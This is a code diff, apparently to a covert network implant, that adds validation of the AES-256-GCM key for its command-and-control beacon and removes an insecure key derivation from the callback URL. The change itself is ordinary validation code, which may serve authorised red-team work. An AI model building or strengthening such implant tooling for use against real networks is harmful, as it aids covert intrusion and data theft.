@@ -39,6 +39,62 @@ _SYSFS_NET = "/sys/class/net"
 _PROC_NET_ROUTE = "/proc/net/route"
 _MONITOR_DRIVERS = ("88XXau", "rtl8812au", "8812au")
 
+KEY_GENERATOR = ('python3 -c "import os,base64; '
+                 'print(base64.b64encode(os.urandom(32)).decode())"')
+
+
+def decode_key(value, field: str = "encryption_key") -> bytes:
+    """The AES-256-GCM key in `value`, or a ValueError naming what is wrong.
+
+    There is no derivation and no default: a key that both ends can compute
+    from the callback URL is a key anyone who sees one message can compute.
+    The messages name the field and the problem and never the value or any
+    part of it, and are raised outside the except block so the decoder's
+    own error cannot ride along in the chain.
+    """
+    text = value.strip() if isinstance(value, str) else ""
+    problem = None
+    key = b""
+    if not text:
+        problem = ("%s is required: the beacon has no default key and will "
+                   "not derive one. Generate one with: %s"
+                   % (field, KEY_GENERATOR))
+    else:
+        try:
+            key = base64.b64decode(text, validate=True)
+        except ValueError:
+            problem = ("%s is not valid base64. Generate a key with: %s"
+                       % (field, KEY_GENERATOR))
+        else:
+            if len(key) != 32:
+                problem = ("%s decodes to %d bytes; AES-256-GCM needs "
+                           "exactly 32. Generate a key with: %s"
+                           % (field, len(key), KEY_GENERATOR))
+    if problem:
+        raise ValueError(problem)
+    return key
+
+
+def beacon_key_problem(config) -> Optional[str]:
+    """Why the implant config cannot supply the beacon's key, or None.
+
+    Asked only where a Python beacon can be built: c2 and the fallback both
+    enabled. A config that builds none needs no key, and demanding one would
+    break it. Checked when the config is loaded so a bad key stops the
+    process before the sniffer and cover are up, not after.
+    """
+    c2 = config.get("c2") if isinstance(config, dict) else None
+    if not isinstance(c2, dict) or not c2.get("enabled"):
+        return None
+    fallback = c2.get("fallback")
+    if not isinstance(fallback, dict) or not fallback.get("enabled"):
+        return None
+    try:
+        decode_key(c2.get("encryption_key"), "c2.encryption_key")
+    except ValueError as exc:
+        return str(exc)
+    return None
+
 
 # ── Stdlib AES-256-GCM via OpenSSL ctypes ──
 
@@ -1314,12 +1370,7 @@ class Beacon:
         self.quic_enabled = quic_cfg.get("enabled", False)
         self.quic_server = quic_cfg.get("server", "")
 
-        enc_key = c2.get("encryption_key", "")
-        if enc_key:
-            self._key = base64.b64decode(enc_key)
-        else:
-            seed = f"{self.callback_url}:{self.dns_domain}".encode()
-            self._key = hashlib.sha256(seed).digest()
+        self._key = decode_key(c2.get("encryption_key"))
 
         proxy_cfg = c2.get("proxy", {})
         self.proxy_mode = proxy_cfg.get("mode", "auto")
